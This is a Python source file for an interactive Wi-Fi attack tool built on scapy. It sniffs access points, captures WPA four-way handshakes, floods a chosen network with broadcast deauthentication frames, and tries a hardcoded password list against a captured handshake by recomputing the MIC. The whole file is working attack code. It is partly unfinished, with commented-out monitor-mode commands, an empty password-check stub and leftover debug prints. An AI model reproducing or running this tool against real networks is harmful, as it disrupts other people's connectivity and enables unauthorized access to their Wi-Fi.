# from re import S
from os import system, geteuid
from scapy.layers.dot11 import Dot11Elt, Dot11, RadioTap, Dot11Deauth #, TO_DS
from scapy.layers.eap import EAPOL, EAP
# from scapy.packet import Dot11
from scapy.config import conf
from scapy.all import Raw, sniff, sendp
from socket import if_nameindex
from InquirerPy import prompt
from InquirerPy.utils import color_print
from InquirerPy.enum import INQUIRERPY_FILL_CIRCLE_SEQUENCE
from threading import Thread
from binascii import hexlify, unhexlify, a2b_hex
from hashlib import pbkdf2_hmac, sha1
from hmac import new as newHmac

interface = None
pointer = INQUIRERPY_FILL_CIRCLE_SEQUENCE
SSIDList = {}

class APInfo:
    def __init__(self, BSSID, name):
        self.BSSID = BSSID
        self.name = name
        self.handshakeToFrames = []
        self.handshakeFromFrames = []
        self.capturedHandshake = False

    def storeHandshakeFrame(self, frame):
        if self.capturedHandshake: return

        if frame.FCfield.to_DS and len(self.handshakeToFrames) < 2: # Client => Access Point
            self.handshakeToFrames.append(frame)
        elif not frame.FCfield.to_DS and len(self.handshakeFromFrames) < 2: # Access Point => Client
            self.handshakeFromFrames.append(frame)

        self.capturedHandshake = len(self.handshakeFromFrames) == 2 and len(self.handshakeToFrames) == 2
        if self.capturedHandshake: color_print([("green", f"Captured handshake for network \"{self.BSSID} : {self.name}\"")])

def sniffThread():
    sniff(iface=interface, prn=sniffCallback, store=0)

def sniffCallback(packet):
    if not packet.haslayer(Dot11): return

    try:
        DestMAC = packet.addr1
        SrcMAC = packet.addr2
        BSSID = packet.addr3
    except:
        pass

    try:
        SSIDLen = packet[Dot11Elt].len
        SSID = packet[Dot11Elt].info
    except:
        SSIDLen = 0
        SSID = None

    if SSID != None and packet.type == 0 and packet.subtype == 8:
        global SSIDList

        if BSSID in SSIDList.keys(): return
        SSIDList[BSSID] = APInfo(BSSID, SSID.decode('ascii'))

    if packet.haslayer(EAPOL) and BSSID in SSIDList.keys():
        SSIDList[BSSID].storeHandshakeFrame(packet)

def doAttack():
    refreshNetworks = True
    while refreshNetworks:
        refresh = "Refresh Networks List"
        back = "Back to Main Menu"

        capturedList = [f"# {mac} : {info.name}" for mac, info in SSIDList.items()]
        if len(capturedList) == 0:
            color_print([("red", "No SSIDs found yet")])
            return
            
        result = prompt({ "message": "Select WiFi Network to DeAuth:", "type": "list", "choices": [refresh, back] + capturedList, "pointer": pointer})

        refreshNetworks = result[0] == refresh
    
    if result[0] == back: return

    targetMac = result[0][2:19]
    print("Sending deauth frames to " + targetMac + "...")

    # Construct the 802.11 frame:
    # addr1 = Destination MAC, addr2 = Source MAC, addr3 = Access Point MAC
    dot11 = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=targetMac, addr3=targetMac)
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)

    # Send the packet:
    sendp(packet, inter=0.1, count=50, iface=interface, verbose=0)

def doCrack():
    back = "Back to Main Menu"

    capturedList = [f"# {mac} : {info.name}" for mac, info in SSIDList.items() if info.capturedHandshake]
    if len(capturedList) == 0:
        color_print([("red", "No handshakes captured yet")])
        return
        
    result = prompt({ "message": "Select Captured Handshake to Crack:", "type": "list", "choices": [back] + [f"# {mac} : {info.name}" for mac, info in SSIDList.items() if info.capturedHandshake], "pointer": pointer })
    if result[0] == back: return

    print("Cracking password...")
    targetMac = result[0][2:19]
    info = SSIDList[targetMac]

    # Build key data field
    pke = b"Pairwise key expansion"
    apMac = unhexlify(info.handshakeFromFrames[0].addr2.replace(':','',5))
    clientMac = unhexlify(info.handshakeFromFrames[0].addr1.replace(':','',5))
    anonce = info.handshakeFromFrames[0].load[13:45]
    snonce = info.handshakeToFrames[0].load[13:45]

    keyData = min(apMac, clientMac) + max(apMac, clientMac) + min(anonce, snonce) + max(anonce, snonce)
    print(keyData)
    # Sniffed MIC
    sniffedMessageIntegrityCheck = hexlify(info.handshakeToFrames[0][Raw].load)[154:186]

    # WPA data field with zeroed MIC
    wpaData = hexlify(bytes(info.handshakeToFrames[0][EAPOL]))
    wpaData = wpaData.replace(sniffedMessageIntegrityCheck, b"0" * 32)
    wpaData = a2b_hex(wpaData)

    passwords = ["19481948","yarab"]
    for password in passwords:
        # Calculate Pairwise Master Key
        pairwiseMasterKey = pbkdf2_hmac('sha1', password.encode('ascii'), info.name.encode('ascii'), 4096, 32)
        print(pairwiseMasterKey)

        # Calculate Pairwise Transient Key
        blen = 64
        i = 0
        R = b""

        while i<=((blen*8+159) /160):
            hmacsha1 = newHmac(pairwiseMasterKey, pke + chr(0x00).encode() + keyData + chr(i).encode(), sha1)
            i += 1
            R = R + hmacsha1.digest()

        pairwiseTransientKey = R[:blen]

        # Calculate password MIC
        passwordMessageIntegrityCheck = newHmac(pairwiseMasterKey[0:16], wpaData, "sha1").hexdigest()
        print(passwordMessageIntegrityCheck)
        print(sniffedMessageIntegrityCheck)
        print(sniffedMessageIntegrityCheck.decode())
        # Compare the MICs
        # if passwordMessageIntegrityCheck[:-8] == sniffedMessageIntegrityCheck.decode():
        print(passwordMessageIntegrityCheck[:-8] == sniffedMessageIntegrityCheck.decode())
        
    # checkPassword(info)

# def checkPassword(apInfo, password):




def main():
    if geteuid() != 0:
        print("Please run this script as root")
        exit(1)

    interfaces = if_nameindex()
    result = prompt({ "message": "Select WiFi Adapter:", "type": "list", "choices": [f"# {x[1]}" for x in interfaces] + ["Quit"], "pointer": pointer })
    if result[0] == "Quit": exit(0)

    global interface
    interface = result[0][2:]

    print("Turning interface into monitor mode...")
    # system(f"ifconfig {interface} down")
    # system(f"iwconfig {interface} mode monitor")
    # system(f"iwconfig {interface} freq 10")
    # system(f"ifconfig {interface} up")
    # system("airmon-ng check kill")
    # system(f"airmon-ng start {interface}")
    print("Interface turned into monitor mode!")

    Thread(target=sniffThread, daemon=True).start()
    # sniff(iface=interface, prn=sniffCallback, store=0)

    while True:
        attack = "DeAuth WiFi Networks"
        crack = "Crack Captured Handshakes"
        result = prompt({ "message": "Select Action:", "type": "list", "choices": [attack, crack, "Quit"], "pointer": pointer })

        if result[0] == attack: doAttack()
        elif result[0] == crack: doCrack()
        else: quit()

if __name__ == "__main__":
    main()
